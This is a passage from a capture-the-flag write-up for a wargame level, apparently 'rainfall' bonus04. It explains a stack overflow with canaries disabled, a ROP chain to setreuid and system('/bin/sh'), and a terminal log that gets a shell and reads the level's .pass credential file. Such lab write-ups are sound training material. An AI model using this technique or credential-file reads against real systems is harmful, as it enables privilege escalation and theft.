Decompiling the binary reveals that `handle_input` contains an unbounded stack buffer overflow. Unlike the previous challenges, stack canaries are disabled, significantly simplifying the exploit strategy.

Without canary constraints, we do not need an information leak phase. We directly overflow the stack buffer up to the saved return address (`RIP`), overwriting it with our ROP chain to invoke `setreuid` and `system("/bin/sh")`.

```sh
bonus04@rainfall:~$ echo "" > exploit.py && vim exploit.py && python3 exploit.py
[+] Starting local process '/home/bonus04/matrix': pid 1748
[*] Switching to interactive mode
[MATRIX] Unknown command.
$ whoami
flagbonus04
$ cat /home/$(whoami)/.pass
d2wlrk7cuuruus7iwfayjdjaiwagj7dl
```